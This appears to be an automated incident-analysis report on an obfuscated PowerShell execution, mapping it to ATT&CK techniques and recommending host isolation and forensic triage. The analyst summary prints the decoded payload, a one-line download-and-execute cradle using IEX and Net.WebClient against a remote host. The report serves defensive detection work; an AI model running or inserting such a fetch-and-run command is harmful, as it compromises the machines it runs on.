summary.executive: Event: powershell was invoked with an obfuscated command consistent with confirmed malicious activity. The recovered command hides its actual behaviour from static inspection. Behaviour maps to T1059.001 · PowerShell, T1027.010 · Command Obfuscation: Base64/Encoded Command. Verdict: Malicious at 57% confidence.
summary.analyst:
Event: powershell was invoked with an obfuscated command consistent with confirmed malicious activity. Recovered payload reads: `IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.1/mal.exe')`, which corroborates that powershell was used as a launcher for downstream code rather than a routine administrative task.

Living-off-the-land use of powershell bypasses application-allowlisting because the binary itself is signed and trusted; the malicious intent lives in the arguments, not the executable. Investigation mapped the observed behaviour to T1059.001 · PowerShell, T1027.010 · Command Obfuscation: Base64/Encoded Command, T1105 · Ingress Tool Transfer.

Supporting evidence, in weight order: Execution chain · 4 correlated stages [SYNTH-CHAIN-4]; internal decoder step [N-002]; internal decoder step [N-003]; internal decoder step [N-004]; LOLBAS · powershell.exe [META-lolbas-001].

Impact is confirmed malicious. Any endpoint that executed this payload should be considered compromised until proven otherwise.

No containment signal was observed in the submitted evidence (no quarantine, block, or prevent action was reported). This does not mean containment did not occur — it means the artefact submitted to NivXRay did not include that telemetry.

Recommended next actions: 1. Isolate affected hosts and block the identified indicators at the perimeter; 2. Preserve host artefacts and start forensic triage for the affected users.
